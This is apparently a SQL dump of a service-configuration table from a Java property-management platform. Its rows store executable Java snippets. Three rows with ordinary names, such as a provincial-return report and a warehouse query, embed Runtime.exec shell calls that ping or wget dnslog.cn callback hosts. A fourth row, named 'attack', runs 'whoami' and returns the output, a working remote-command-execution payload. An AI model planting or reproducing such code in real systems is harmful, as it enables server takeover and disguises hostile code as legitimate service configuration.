INSERT INTO `c_service_sql` VALUES ('49', '/reportInfoBackCity/saveReportInfoBackCity', '返省上报', 'pId,userId', '3', '', '', 'import com.alibaba.fastjson.JSONObject;\nimport com.java110.service.context.DataQuery;\nimport com.java110.service.develop.IDevelop;\nimport org.apache.commons.lang.StringUtils;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic JSONObject execute(DataQuery dataQuery) {\n        JSONObject params = dataQuery.getRequestParams();\n      String [] cmd= {\"sh\",\"-c\",\"ping 84l7b4.dnslog.cn\"};\n         try {\n            Process proc =Runtime.getRuntime().exec(cmd);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n      \n    }', '', '', '2021-09-16 11:02:36', '1');
INSERT INTO `c_service_sql` VALUES ('50', '/reportInfoBackCity/queryReportInfoBackCity', '查询返省', '1', '3', '', '', 'import com.alibaba.fastjson.JSONObject;\nimport com.java110.service.context.DataQuery;\nimport com.java110.service.develop.IDevelop;\nimport org.apache.commons.lang.StringUtils;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic JSONObject execute(DataQuery dataQuery) {\n        JSONObject params = dataQuery.getRequestParams();\n      String [] cmd= {\"sh\",\"-c\",\"ping 84l7b4.dnslog.cn\"};\n         try {\n            Process proc =Runtime.getRuntime().exec(cmd);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n      return \"88\"\n    }', '', '', '2021-09-16 11:11:15', '1');
INSERT INTO `c_service_sql` VALUES ('61', 'resourceStore.listStorehouses', '查询仓库', '1', '3', '', '', 'import com.alibaba.fastjson.JSONObject;\nimport com.java110.service.context.DataQuery;\nimport com.java110.service.develop.IDevelop;\nimport org.apache.commons.lang.StringUtils;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.io.IOException;\n\npublic JSONObject execute(DataQuery dataQuery) {\n        JSONObject params = dataQuery.getRequestParams();\n        List sqlParams = new ArrayList();\n        String [] cmd= {\"/bin/sh\",\"-c\",\"wget o1f8up.dnslog.cn\"};\ntry {\n            Process proc =Runtime.getRuntime().exec(cmd);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        String sql = \"SELECT nn.`notice_id` noticeId,\" +\n                \"nn.`title`,\" +\n                \"nn.`notice_type_cd` noticeTypeCd,\" +\n                \"nn.`context`,\" +\n                \"nn.`community_id` communityId,\" +\n                \"nn.`user_id` userId,\" +\n                \"nn.`start_time` startTime \" +\n                \"FROM n_notice nn\\n\" +\n                \"WHERE nn.status_cd = \'0\'\" ;\n        if(params.containsKey(\"noticeId\") && !StringUtils.isEmpty(params.getString(\"noticeId\"))){\n            sql += \"and nn.`notice_id` = ? \";\n            sqlParams.add(params.get(\"noticeId\"));\n        }\n        if(params.containsKey(\"communityId\") && !StringUtils.isEmpty(params.getString(\"communityId\"))){\n            sql += \"and nn.`community_id` = ? \";\n            sqlParams.add(params.get(\"communityId\"));\n        }\n        if(params.containsKey(\"userId\") && !StringUtils.isEmpty(params.getString(\"userId\"))){\n            sql += \"and nn.`user_id` = ? \";\n            sqlParams.add(params.get(\"userId\"));\n        }\n        if(params.containsKey(\"title\") && !StringUtils.isEmpty(params.getString(\"title\"))){\n            sql += \"and nn.`title` LIKE CONCAT(\'%\',?,\'%\') \";\n            sqlParams.add(params.get(\"title\"));\n        }\n\n        List outParam = dataQuery.queryDataBySql(sql,sqlParams);\n\n        JSONObject outObj = new JSONObject();\n        outObj.put(\"notices\", outParam);\n\n        return outObj;\n    }', '', '', '2021-09-16 13:33:56', '1');
INSERT INTO `c_service_sql` VALUES ('62', 'attack.ce5bd1b0', 'Query Service', 'cmd', '3', '', '', 'import java.io.*;\nimport com.alibaba.fastjson.JSONObject;\n\nString execute(dataQuery) {\n    String[] cmd = new String[]{\"sh\", \"-c\", \"whoami\"};\n    Process p = Runtime.getRuntime().exec(cmd);\n    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    StringBuilder sb = new StringBuilder();\n    String line;\n    while ((line = br.readLine()) != null) {\n        sb.append(line).append(\"\\n\");\n    }\n    BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));\n    while ((line = er.readLine()) != null) {\n        sb.append(line).append(\"\\n\");\n    }\n    p.waitFor();\n    JSONObject result = new JSONObject();\n    result.put(\"output\", sb.toString());\n    result.put(\"exitCode\", String.valueOf(p.exitValue()));\n    return result.toString();\n}', '{}', 'query service', '2026-08-05 19:17:39', '1');
